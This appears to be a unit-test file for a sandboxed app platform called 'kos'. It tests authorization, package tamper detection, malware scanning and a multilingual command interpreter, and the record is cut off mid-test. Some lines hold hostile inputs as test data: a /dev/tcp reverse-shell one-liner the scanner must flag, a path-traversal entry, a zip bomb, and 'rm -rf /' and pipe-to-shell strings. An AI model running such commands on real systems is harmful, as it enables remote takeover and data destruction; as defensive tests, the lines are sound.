"""Run with: python3 -m unittest discover -s tests -v"""

import io
import json
import os
import socket
import sys
import tempfile
import threading
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kos import loader  # noqa: E402
from kos.auth import Authority, AuthorizationDenied, KdfParams, PasswordStore, Throttle  # noqa: E402
from kos.cellagent import serve  # noqa: E402
from kos.cells import CellSpec, qemu_argv, send_app  # noqa: E402
from kos.devices import INPUT_EVENT, EvdevTranslator, ScriptedDevices  # noqa: E402
from kos.display import Framebuffer, GraphicalSurface, HeadlessBackend, parse_color  # noqa: E402
from kos.kapp import KApp, KAppError, pack  # noqa: E402
from kos.paths import Paths  # noqa: E402
from kos.prompt import ScriptedPrompter  # noqa: E402
from kos.protocol import Channel, ProtocolError, validate_app_message  # noqa: E402
from kos.sandbox import SandboxPolicy  # noqa: E402
from kos.session import Session  # noqa: E402
from kos.store import AppStore, TamperedError  # noqa: E402
from kos.term import KeyParser  # noqa: E402
from kos.vfs import VFS, VFSError  # noqa: E402
from kos.registry import Instance, Registry  # noqa: E402
from kos.broker import spawn  # noqa: E402
from kos.cmdsurface import CmdSurface  # noqa: E402
from kos.protocol import validate_app_message as _vam  # noqa: E402
from kos.scan import EICAR, scan_bytes  # noqa: E402
from kos.permit import PermitError, PermitStore  # noqa: E402
from kos.optimize import optimize  # noqa: E402
from kos import cache as kcache  # noqa: E402
from kos.store import VirusFoundError  # noqa: E402
from kos.watch import Watcher  # noqa: E402
from kos import cli as kcli  # noqa: E402

PW = "correct horse battery"
EXAMPLE = Path(__file__).resolve().parent.parent / "examples" / "hello"


class Env(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        os.chmod(self.tmp.name, 0o755)
        self.paths = Paths(Path(self.tmp.name))
        PasswordStore(self.paths).create(PW.encode(), KdfParams.fresh(n=2**10), throttle_base=0)
        self.kapp = Path(self.tmp.name) / "hello.kapp"
        pack(EXAMPLE, self.kapp)

    def tearDown(self):
        self.tmp.cleanup()
        shm = Path("/dev/shm") / f"kos-{os.getuid()}"          # empty RAM scratch left by fake spawners
        for d in shm.glob("*") if shm.exists() else []:
            try:
                d.rmdir()
            except OSError:
                pass

    def authority(self, *answers):
        self.prompter = ScriptedPrompter(answers)
        return Authority(self.paths, self.prompter, Throttle(self.paths, base=0))


class TestAuth(Env):
    def test_grant_is_bound_to_action(self):
        g = self.authority(PW).authorize("app.run", "hello")
        g.check("app.run", "hello")
        with self.assertRaises(AuthorizationDenied):
            g.check("app.install", "hello")
        g.close()
        with self.assertRaises(AuthorizationDenied):
            g.key("x")

    def test_wrong_password_denied_and_audited(self):
        a = self.authority("nope", "nope", "nope")
        with self.assertRaises(AuthorizationDenied):
            a.authorize("device.mouse", "hello")
        self.assertEqual([e["outcome"] for e in a.audit.entries()][-1], "denied")

    def test_unknown_action_refused(self):
        with self.assertRaises(AuthorizationDenied):
            self.authority().authorize("do.anything")


class TestKApp(Env):
    def zip_with(self, files):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            for n, d in files.items():
                z.writestr(n, d)
        return b.getvalue()

    def test_rejects_traversal_and_bad_manifest(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m, "../evil": "x", "a.py": ""}))
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m.replace('"x"', '"graphical"'), "a.py": ""}))

    def test_rejects_zip_bomb(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("manifest.json", m)
            z.writestr("a.py", "")
            z.writestr("bomb", b"\0" * (50 << 20))
        with self.assertRaises(KAppError):
            KApp(b.getvalue())


class TestStore(Env):
    def test_install_keeps_zip_and_detects_tamper(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        stored = self.paths.apps / "hello.kapp"
        self.assertEqual(stored.read_bytes(), self.kapp.read_bytes())  # never unzipped
        with self.authority(PW).authorize("app.run", "hello") as g:
            store.load_verified("hello", g)
        data = bytearray(stored.read_bytes())
        data[-30] ^= 1
        stored.write_bytes(bytes(data))
        with self.authority(PW).authorize("app.run", "hello") as g:
            with self.assertRaises(TamperedError):
                store.load_verified("hello", g)


    def test_update_requires_newer_version(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        src = Path(self.tmp.name) / "src"
        import shutil
        shutil.copytree(EXAMPLE, src)
        m = json.loads((src / "manifest.json").read_text())
        m["version"] = "0.9"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "old.kapp")
        with self.assertRaises(KAppError):
            store.update(Path(self.tmp.name) / "old.kapp", self.authority())
        m["version"] = "1.10"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "new.kapp")
        old, new = store.update(Path(self.tmp.name) / "new.kapp", self.authority(PW))
        self.assertEqual((old, new.version), ("1.0", "1.10"))
        with self.authority(PW).authorize("app.run", "hello") as g:
            self.assertEqual(store.load_verified("hello", g).manifest.version, "1.10")


class TestProtocol(unittest.TestCase):
    def test_escape_injection_stripped(self):
        m = validate_app_message({"cmd": "screen", "title": "\x1b]0;pwn\x07hi",
                                  "lines": ["a\x1b[2Jb"]}, "tui")
        self.assertEqual(m["title"], "]0;pwnhi")
        self.assertNotIn("\x1b", m["lines"][0])

    def test_mode_enforced(self):
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": []}, "tui")
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": [["rect", 0, 0, 1, 1, "red"]]},
                                 "graphical")


class TestDisplayAndInput(unittest.TestCase):
    def test_rect_and_text(self):
        fb = Framebuffer(20, 10)
        fb.rect(2, 2, 3, 3, parse_color("#ff0000"))
        self.assertEqual(fb.pixel(3, 3), (255, 0, 0))
        self.assertEqual(fb.pixel(6, 6), (0, 0, 0))
        fb.text(0, 0, "I", parse_color("#00ff00"))
        self.assertEqual(fb.pixel(2, 1), (0, 255, 0))

    def test_key_parser(self):
        ev = KeyParser().feed(b"a\x1b[A\r\x03\x1b[<0;5;3M")
        self.assertEqual([e.get("key", e["type"]) for e in ev],
                         ["a", "up", "enter", "interrupt", "button"])
        self.assertEqual((ev[-1]["x"], ev[-1]["y"]), (4, 2))

    def test_evdev_translate(self):
        tr = EvdevTranslator(100, 100)
        raw = (INPUT_EVENT.pack(0, 0, 2, 0, 5) + INPUT_EVENT.pack(0, 0, 0, 0, 0)
               + INPUT_EVENT.pack(0, 0, 1, 0x110, 1) + INPUT_EVENT.pack(0, 0, 1, 30, 1))
        ev = tr.feed(raw)
        self.assertEqual(ev[0], {"type": "pointer", "x": 55, "y": 50})
        self.assertEqual(ev[1]["button"], "left")
        self.assertEqual(ev[2], {"type": "key", "key": "a"})


class TestSandboxedRun(Env):
    def test_session_boots_devices_with_password(self):
        """Full flow: app launched from zip in RAM; mouse and keyboard only
        reach the app after 'y' + password in the trusted prompt."""
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        with self.authority(PW).authorize("app.graphical", "hello") as g:
            app = store.load_verified("hello", g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), "graphical"), SandboxPolicy(), None)
        b.close()
        devices = ScriptedDevices()
        backend = HeadlessBackend(120, 80)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = Session(name="hello", mode="graphical", channel=Channel(a), proc=proc,
                    surface=GraphicalSurface(backend), devices=devices, authority=auth)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        # A key before the keyboard is booted must NOT reach the app.
        devices.push({"type": "key", "key": "Z"})
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 50, "y": 60},
                     {"type": "pointer", "x": 100, "y": 10},       # move the pointer off the dot so it is visible
                     *keys("ok"))
        threading.Timer(4.0, lambda: devices.push({"type": "key", "key": "escape"})).start()
        code = s.run(first_frame_timeout=5)
        self.assertEqual(code, 0)
        self.assertEqual(devices.booted, ["mouse", "keyboard"])
        last = backend.frames[-1]
        self.assertEqual(last.pixel(49, 60), (255, 80, 128))  # the click drew a dot
        outcomes = [(e["action"], e["outcome"]) for e in auth.audit.entries()]
        self.assertIn(("device.mouse", "granted"), outcomes)
        self.assertIn(("device.keyboard", "granted"), outcomes)

    def test_cell_agent_runs_app(self):
        """Cells hold Python/native apps only (no Node.js inside a cell VM)."""
        import shutil
        src = Path(self.tmp.name) / "hello-py"
        shutil.copytree(EXAMPLE, src)
        manifest = json.loads((src / "manifest.json").read_text())
        manifest.update(runtime="python", entry="app:main")
        (src / "manifest.json").write_text(json.dumps(manifest))
        pack(src, Path(self.tmp.name) / "hello-py.kapp")
        app = KApp((Path(self.tmp.name) / "hello-py.kapp").read_bytes())
        path = os.path.join(self.tmp.name, "agent.sock")
        lst = socket.socket(socket.AF_UNIX)
        lst.bind(path)
        lst.listen(1)
        t = threading.Thread(target=serve, args=(lst,), kwargs={"once": True})
        t.start()
        c = socket.socket(socket.AF_UNIX)
        c.connect(path)
        send_app(c, app, "tui")
        c.sendall(b'{"cmd":"hello","mode":"tui","width":80,"height":20}\n')
        msg = json.loads(c.makefile().readline())
        self.assertEqual(msg["cmd"], "screen")
        c.sendall(b'{"cmd":"quit"}\n')
        c.close()
        t.join(10)

    def test_qemu_argv_pins_cores(self):
        argv = qemu_argv(CellSpec("web", "/k", "/i", cpus=[2, 3], cid=5), "/log")
        self.assertEqual(argv[:3], ["taskset", "-c", "2,3"])
        self.assertIn("vhost-vsock-device,guest-cid=5", argv)


class TestVFS(Env):
    def test_cd_into_zip_without_extracting(self):
        vfs = VFS(self.tmp.name)
        vfs.cd("hello.kapp")
        names = {e.name for e in vfs.list()}
        self.assertIn("manifest.json", names)
        self.assertIn("app.py", names)
        data = vfs.read_bytes("manifest.json")
        self.assertIn(b'"hello"', data)
        self.assertFalse(Path(self.tmp.name, "manifest.json").exists())  # never extracted
        vfs.up()
        self.assertEqual(vfs.pwd(), self.tmp.name)

    def test_bad_moves_rejected(self):
        vfs = VFS(self.tmp.name)
        with self.assertRaises(VFSError):
            vfs.cd("does-not-exist")
        with self.assertRaises(VFSError):
            vfs.up()  # already at the top


class TestCmdMode(unittest.TestCase):
    def test_screen_and_frame_rejected_in_cmd_mode(self):
        with self.assertRaises(Exception):
            _vam({"cmd": "screen", "title": "x", "lines": []}, "cmd")
        with self.assertRaises(Exception):
            _vam({"cmd": "frame", "ops": []}, "cmd")
        self.assertEqual(_vam({"cmd": "log", "msg": "hi"}, "cmd"), {"cmd": "log", "msg": "hi"})

    def test_cmd_surface_echoes_commands(self):
        r, w = os.pipe()
        surface = CmdSurface(w, 80, 24, "hello")
        surface.emit(">", {"cmd": "key", "key": "a"})
        surface.emit("<", {"cmd": "log", "msg": "got it"})
        os.close(w)
        with os.fdopen(r) as rf:
            out = rf.read()
        self.assertIn('> {"cmd":"key","key":"a"}', out)
        self.assertIn('< {"cmd":"log","msg":"got it"}', out)


def _alive_pid(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False


class TestOpenAttachClose(Env):
    """The `open`/`ps`/`attach`/`close` lifecycle, exercised in cmd mode so
    no real terminal is needed: `open` launches the app in the background
    under a broker, `attach` drives it, Ctrl-C detaches (app keeps running),
    `close` actually stops it."""

    def _open(self, mode="cmd"):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        action = "app.graphical" if mode == "graphical" else "app.open"
        with self.authority(PW).authorize(action, "hello") as grant:
            app = store.load_verified("hello", grant)
        registry = Registry(self.paths)
        inst_id = registry.new_id("hello")
        inst = Instance(id=inst_id, name="hello", mode=mode, broker_pid=0,
                        sock_path=str(self.paths.state / "instances" / f"{inst_id}.sock"),
                        log_path=str(self.paths.logs / f"{inst_id}.log"), started=0)
        spawn(inst, app, mode, SandboxPolicy(), registry, Path(inst.log_path))
        return registry, inst_id

    def _wait_running(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return insts[inst_id]
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")

    def test_open_ps_attach_detach_close(self):
        registry, inst_id = self._open("cmd")
        inst = self._wait_running(registry, inst_id)
        self.assertTrue(inst.app_pid)
        self.assertEqual([i.id for i in registry.list()], [inst_id])

        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(inst.sock_path)
        from kos.devices import ScriptedDevices
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        devices = ScriptedDevices()
        r_fd, w_fd = os.pipe()
        cmdsurface = CmdSurface(w_fd, 80, 24, "hello")
        s = Session(name="hello", mode="cmd", channel=Channel(sock), proc=None,
                    surface=cmdsurface, devices=devices, authority=auth,
                    detach_on_interrupt=True)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1})
        devices.push({"type": "interrupt"})  # Ctrl-C: must DETACH, not kill the app
        code = s.run(first_frame_timeout=0.2)
        os.close(w_fd)
        self.assertEqual(code, 0)
        self.assertTrue(s.detached)
        with os.fdopen(r_fd) as rf:
            log = rf.read()
        self.assertIn('"cmd":"button"', log)   # our click really reached the app
        self.assertIn('"cmd":"log"', log)      # and the app really answered

        # still running after detach
        self.assertEqual(registry.get(inst_id).status, "running")
        self.assertTrue(_alive_pid(registry.get(inst_id).broker_pid))

        # close actually stops it
        import signal
        import time
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not (self.paths.state / "instances" / f"{inst_id}.json").exists():
                break
            time.sleep(0.1)
        self.assertFalse((self.paths.state / "instances" / f"{inst_id}.json").exists())
        self.assertFalse(os.path.exists(inst.sock_path))

    def test_two_opens_are_independent(self):
        registry, id1 = self._open("cmd")
        registry, id2 = self._open("cmd")
        self._wait_running(registry, id1)
        self._wait_running(registry, id2)
        ids = {i.id for i in registry.list()}
        self.assertEqual(ids, {id1, id2})
        import signal
        import time
        os.kill(registry.get(id1).broker_pid, signal.SIGTERM)
        os.kill(registry.get(id2).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not registry.list():
                break
            time.sleep(0.1)
        self.assertEqual(registry.list(), [])


class TestActivity(Env):
    def test_feed_merges_open_apps_and_audit(self):
        from kos.activity import build_feed, render_feed
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        registry, inst_id = TestOpenAttachClose._open(self, "cmd")
        self._wait_running_local(registry, inst_id)
        items = build_feed(self.paths)
        texts = [i.text for i in items]
        self.assertTrue(any("hello" in t and "open" in t for t in texts))
        self.assertTrue(any("app.install" in t for t in texts))
        self.assertIn("hello", render_feed(items))
        import signal
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)

    def _wait_running_local(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")


class TestScan(unittest.TestCase):
    def test_eicar_flagged_clean_file_passes(self):
        self.assertFalse(scan_bytes(EICAR, "eicar").clean)
        self.assertTrue(scan_bytes(b"print('hello')", "hello.py").clean)

    def test_recurses_into_zip_without_extracting(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", "{}")
            z.writestr("payload.bin", EICAR)
        result = scan_bytes(buf.getvalue(), "evil.kapp")
        self.assertFalse(result.clean)
        self.assertTrue(any("payload.bin" in f.path for f in result.findings))

    def test_reverse_shell_pattern_detected(self):
        r = scan_bytes(b"os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')", "x.py")
        self.assertFalse(r.clean)
        self.assertEqual(r.findings[0].rule, "reverse-shell")


class TestInstallScanning(Env):
    def test_flagged_app_is_quarantined_not_installed(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", json.dumps(
                {"name": "evil", "version": "1", "runtime": "python", "entry": "a"}))
            z.writestr("a.py", "def main():\n    pass\n# " + EICAR.decode())
        bad = Path(self.tmp.name) / "evil.kapp"
        bad.write_bytes(buf.getvalue())
        store = AppStore(self.paths)
        with self.assertRaises(VirusFoundError):
            store.install(bad, self.authority(PW))
        self.assertNotIn("evil", [a.name for a in store.installed()])
        quarantined = list((self.paths.state / "quarantine").glob("*.kapp"))
        self.assertEqual(len(quarantined), 1)
        # no password was ever spent on it: nothing was asked
        self.assertEqual(self.prompter.asked, [])

    def test_clean_app_still_installs(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        self.assertIn("hello", [a.name for a in store.installed()])


class TestPermit(Env):
    def test_grant_revoke_require(self):
        p = PermitStore(self.paths)
        with self.assertRaises(PermitError):
            p.require("hello")
        p.grant("hello")
        p.require("hello")  # no raise
        self.assertEqual([x.name for x in p.list()], ["hello"])
        p.revoke("hello")
        with self.assertRaises(PermitError):
            p.require("hello")

    def test_permit_gate_blocks_run_before_any_password_prompt(self):
        """PermitStore.require() runs before _authority() in cmd_run/cmd_open,
        so an unpermitted app is refused without ever touching a TTY."""
        import os as _os
        old_root = _os.environ.get("KOS_ROOT")
        _os.environ["KOS_ROOT"] = str(self.paths.root)
        try:
            code = kcli.main(["run", "hello"])
        finally:
            if old_root is None:
                _os.environ.pop("KOS_ROOT", None)
            else:
                _os.environ["KOS_ROOT"] = old_root
        self.assertEqual(code, 2)


class TestOptimize(Env):
    def test_recompress_shrinks_and_reseals(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        kapp_path = self.paths.apps / "hello.kapp"
        # re-store it uncompressed so there is guaranteed slack to reclaim
        import zipfile as _zf
        data = kapp_path.read_bytes()
        buf = io.BytesIO()
        with _zf.ZipFile(io.BytesIO(data)) as src, _zf.ZipFile(buf, "w", _zf.ZIP_STORED) as dst:
            for info in src.infolist():
                dst.writestr(info.filename, src.read(info.filename))
        kapp_path.write_bytes(buf.getvalue())

        report = optimize(self.paths, self.authority(PW))
        self.assertGreaterEqual(report.apps_recompressed, 1)
        self.assertGreater(report.bytes_reclaimed, 0)

        # still verifies after being recompressed and re-sealed
        with self.authority(PW).authorize("app.run", "hello") as g:
            app = store.load_verified("hello", g)
        self.assertEqual(app.manifest.name, "hello")

    def test_prunes_dead_registry_entries(self):
        from kos.registry import Instance, Registry
        registry = Registry(self.paths)
        registry.write(Instance(id="dead-1", name="hello", mode="cmd", broker_pid=999999999,
                                sock_path="/nonexistent", log_path="/nonexistent", started=0))
        report = optimize(self.paths, self.authority(PW))
        self.assertEqual(report.dead_instances_pruned, 1)
        self.assertEqual(registry.list(), [])


class TestCache(unittest.TestCase):
    def test_wipe_removes_contents_and_directory(self):
        with tempfile.TemporaryDirectory() as base:
            paths = Paths(Path(base))
            d = kcache.alloc(paths, "hello")
            (d / "secret.txt").write_text("do not persist me")
            (d / "sub").mkdir()
            (d / "sub" / "more.txt").write_text("nor me")
            self.assertTrue(d.exists())
            kcache.wipe(d)
            self.assertFalse(d.exists())

    def test_wipe_of_missing_dir_is_a_noop(self):
        kcache.wipe(Path("/nonexistent/definitely/not/here"))  # must not raise


class TestWatcher(unittest.TestCase):
    def test_detects_a_write_and_the_scanner_flags_it(self):
        from kos.scan import scan_file
        with tempfile.TemporaryDirectory() as d:
            w = Watcher([d])
            (Path(d) / "payload.bin").write_bytes(EICAR)
            import time
            time.sleep(0.2)
            events = w.read_events()
            w.close()
            self.assertTrue(any(e.endswith("payload.bin") for e in events))
            result = scan_file(Path(events[0]))
            self.assertFalse(result.clean)
            self.assertEqual(result.findings[0].rule, "eicar-test-file")




class TestEncryptionReport(Env):
    """`kos encryption` reads /proc and /sys, so a pretend machine can be fed to it."""

    def machine(self, *, mounts, swaps="Filename Type Size Used Priority\n", cpu="flags : fpu vme", cmdline="ro quiet",
                dm=(), plain=(), dumpable="0", power="freeze mem"):
        root = Path(tempfile.mkdtemp(dir=self.tmp.name))
        proc, sysfs = root / "proc", root / "sys"
        (proc / "sys" / "kernel").mkdir(parents=True)
        (proc / "sys" / "fs").mkdir(parents=True)
        (proc / "mounts").write_text(mounts)
        (proc / "swaps").write_text(swaps)
        (proc / "cpuinfo").write_text(cpu + "\n")
        (proc / "cmdline").write_text(cmdline)
        (proc / "sys" / "kernel" / "core_pattern").write_text("core\n")
        (proc / "sys" / "fs" / "suid_dumpable").write_text(dumpable + "\n")
        (sysfs / "power").mkdir(parents=True)
        (sysfs / "power" / "state").write_text(power + "\n")
        for name, uuid, slaves in dm:                          # (kernel name, dm uuid, [devices it sits on])
            d = sysfs / "class" / "block" / name
            (d / "dm").mkdir(parents=True)
            (d / "dm" / "uuid").write_text(uuid + "\n")
            (d / "slaves").mkdir()
            for sl in slaves:
                (d / "slaves" / sl).mkdir()
        for name in plain:
            (sysfs / "class" / "block" / name).mkdir(parents=True, exist_ok=True)
        return str(proc), str(sysfs)

    def items(self, **kw):
        from kos import encryption
        proc, sysfs = self.machine(**kw)
        return {i.layer: i for i in encryption.check(proc, sysfs)}

    def test_a_root_on_luks_is_encrypted_and_a_plain_root_is_not(self):
        enc = self.items(mounts="/dev/dm-0 / ext4 rw 0 0\n", dm=[("dm-0", "CRYPT-LUKS2-abc-root", ["vda2"])], plain=["vda2"])
        self.assertEqual(enc["disk (at rest)"].status, "ok")
        lvm = self.items(mounts="/dev/dm-1 / ext4 rw 0 0\n",
                         dm=[("dm-1", "LVM-xyz", ["dm-0"]), ("dm-0", "CRYPT-LUKS2-abc", ["vda2"])], plain=["vda2"])
        self.assertEqual(lvm["disk (at rest)"].status, "ok")                    # LUKS underneath LVM counts
        bad = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"])
        self.assertEqual(bad["disk (at rest)"].status, "no")
        self.assertIn("luks", bad["disk (at rest)"].fix.lower())

    def test_swap_must_be_absent_or_encrypted(self):
        none = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"])
        self.assertEqual(none["swap"].status, "ok")
        bad = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2", "vda3"],
                         swaps="Filename Type Size Used Priority\n/dev/vda3 partition 100 0 -2\n")
        self.assertEqual(bad["swap"].status, "no")
        filebad = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"],
                             swaps="Filename Type Size Used Priority\n/swapfile file 100 0 -2\n")
        self.assertEqual(filebad["swap"].status, "no")
        good = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"], dm=[("dm-5", "CRYPT-PLAIN-swap", ["vda3"])],
                          swaps="Filename Type Size Used Priority\n/dev/dm-5 partition 100 0 -2\n")
        self.assertEqual(good["swap"].status, "ok")
        z = self.items(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"],
                       swaps="Filename Type Size Used Priority\n/dev/zram0 partition 100 0 100\n")
        self.assertEqual(z["swap"].status, "partial")

    def test_ram_encryption_is_reported_honestly(self):
        base = dict(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"])
        self.assertEqual(self.items(**base)["RAM"].status, "no")                                    # no CPU feature
        can = self.items(cpu="flags : fpu sme", **base)["RAM"]
        self.assertEqual(can.status, "unknown")                                                     # capable, not confirmed
        self.assertIn("mem_encrypt=on", can.fix)
        asked = self.items(cpu="flags : fpu sme", cmdline="ro mem_encrypt=on", **base)["RAM"]
        self.assertEqual(asked.status, "unknown")                                                   # still not claimed active
        self.assertIn("dmesg", asked.detail)
        self.assertEqual(self.items(cpu="flags : fpu tdx_guest", **base)["RAM"].status, "ok")      # an encrypted guest

    def test_hibernation_and_core_dumps_are_flagged(self):
        base = dict(mounts="/dev/vda2 / ext4 rw 0 0\n", plain=["vda2"])
        self.assertEqual(self.items(cmdline="ro resume=/dev/vda3", power="freeze mem disk", **base)["hibernation"].status, "no")
        self.assertEqual(self.items(**base)["hibernation"].status, "ok")
        self.assertEqual(self.items(dumpable="2", **base)["core dumps"].status, "no")

    def test_harden_turns_off_dumps_and_attaching(self):
        out = _sp.run([sys.executable, "-c",
                              "import ctypes,resource;from kos import encryption as e;r=e.harden();"
                              "print(r, ctypes.CDLL(None).prctl(3,0,0,0,0), resource.getrlimit(resource.RLIMIT_CORE))"],
                             cwd=str(Path(__file__).resolve().parent.parent), capture_output=True, text=True)
        self.assertIn("'dumpable_off': True", out.stdout, out.stderr)
        self.assertIn("0 (0, 0)", out.stdout)



if __name__ == "__main__":
    unittest.main()


class TestLang(unittest.TestCase):
    """Every line is a command - unless it is code."""

    def argv(self, line):
        r = __import__("kos.lang", fromlist=["interpret"]).interpret(line)
        self.assertEqual(r.kind, "command", line)
        return list(r.argv)

    def test_same_command_in_many_languages(self):
        for line in ["run hello", "ejecuta hello", "lance hello", "starte hello",
                     "esegui hello", "запусти hello", "运行 hello", "运行hello"]:
            self.assertEqual(self.argv(line), ["run", "hello"], line)

    def test_politeness_articles_and_case_are_ignored(self):
        self.assertEqual(self.argv("Please run the app Hello."), ["run", "hello"])
        self.assertEqual(self.argv("s'il vous plaît lance l'app hello"), ["run", "hello"])
        self.assertEqual(self.argv("por favor, abre hello"), ["open", "hello"])

    def test_mode_words_and_other_verbs(self):
        self.assertEqual(self.argv("abre gráfico hello"), ["open", "graphical", "hello"])
        self.assertEqual(self.argv("escanea notes.kapp"), ["scan", "file", "notes.kapp"])
        self.assertEqual(self.argv("revoke hello"), ["permit", "--revoke", "hello"])
        self.assertEqual(self.argv("escritorio"), ["boot", "desktop"])
        self.assertEqual(self.argv("optimiza"), ["optimize"])

    def test_write_text_is_passed_through_verbatim(self):
        self.assertEqual(self.argv("write notes.txt Hello World."),
                         ["write", "notes.txt", "--text", "Hello World."])
        self.assertEqual(self.argv('write notes.txt "a  b!"'),
                         ["write", "notes.txt", "--text", "a  b!"])

    def test_code_is_a_command_too_and_runs_sandboxed(self):
        from kos.lang import interpret
        for line, lang in [("x = 5", "assignment"), ('print("hi")', "code call"),
                           ("import os", "python"), ("#include <stdio.h>", "c"),
                           ("const a = 1", "javascript"), ("SELECT * FROM users", "sql"),
                           ("run hello; rm -rf /", "shell"), ("list | sh", "shell")]:
            r = interpret(line)
            self.assertEqual((r.kind, r.language), ("code", lang), line)
            self.assertEqual(r.argv[0], "exec")                       # a command, never a shell string
            self.assertEqual(r.argv[2], "--code=" + line)

    def test_plain_words_that_are_also_code_keywords_still_work(self):
        self.assertEqual(self.argv("update hello"), ["update", "hello"])
        self.assertEqual(self.argv("open hello"), ["open", "hello"])
        self.assertEqual(self.argv("run hello --cell=c1"), ["run", "hello", "--cell=c1"])

    def test_unknown_suggests_but_never_guesses(self):
        from kos.lang import interpret
        r = interpret("rn hello")
        self.assertEqual((r.kind, r.hint), ("unknown", "run"))
        self.assertEqual(interpret("banana split").kind, "unknown")

    def test_shell_loop_runs_every_line_as_a_command(self):
        from kos.lang import run_shell
        lines = iter(["run hello", "x = 1", "bonjour", "", "ayuda", "exit", "list"])
        ran, said = [], []
        code = run_shell(lambda argv: ran.append(argv) or 0, lambda _p: next(lines), said.append)
        self.assertEqual(ran, [["run", "hello"], ["exec", "--lang=assignment", "--code=x = 1"]])
        self.assertTrue(any("don't know" in m for m in said))
        self.assertEqual(code, 65)

    def test_cli_do_executes_the_interpreted_command(self):
        import io as _io
        from contextlib import redirect_stdout
        buf = _io.StringIO()
        with tempfile.TemporaryDirectory() as d, redirect_stdout(buf):
            old = os.environ.get("KOS_ROOT")
            os.environ["KOS_ROOT"] = d
            try:
                code = kcli.main(["do", "lista"])
            finally:
                os.environ.pop("KOS_ROOT", None) if old is None else os.environ.update(KOS_ROOT=old)
        self.assertEqual(code, 0)
        self.assertIn("no apps installed", buf.getvalue())
        # code is a command too; one with no sandboxed runtime says so (66) and runs nothing
        with redirect_stdout(io.StringIO()):
            self.assertEqual(kcli.main(["do", "select", "*", "from", "users"]), 66)


from unittest import mock  # noqa: E402
from kos.admin import (AdminError, AdminKeyboard, AdminPrompter, WriteBlocked,  # noqa: E402
                       kernel_gaps, write_file)

GOOD_KERNEL = {"landlock_abi": 3, "user_namespaces": True}


class AdminEnv(Env):
    def kb(self, **kw):
        args = dict(kernel_report=lambda: dict(GOOD_KERNEL), probe=lambda: ["/dev/input/event0"],
                    boot_id=lambda: "boot-1")
        args.update(kw)
        return AdminKeyboard(self.paths, **args)

    def booted(self, **kw):
        kb = self.kb(**kw)
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        return kb


class TestAdminKeyboard(AdminEnv):
    def test_login_password_boots_it_with_no_second_prompt(self):
        auth = self.authority(PW)                       # exactly ONE password is available
        kb = self.kb()
        with auth.authorize("session.login") as grant:
            lease = kb.boot(grant)
        self.assertEqual(self.prompter.answers, [])     # nothing left over, nothing asked twice
        self.assertTrue(lease.exclusive and not lease.weak)
        self.assertIn("ON", kb.status())
        self.assertIn(("admin.boot", "booted"),
                      [(e["action"], e["outcome"]) for e in auth.audit.entries()])

    def test_only_a_login_or_admin_boot_grant_can_boot_it(self):
        with self.authority(PW).authorize("app.run", "hello") as g:
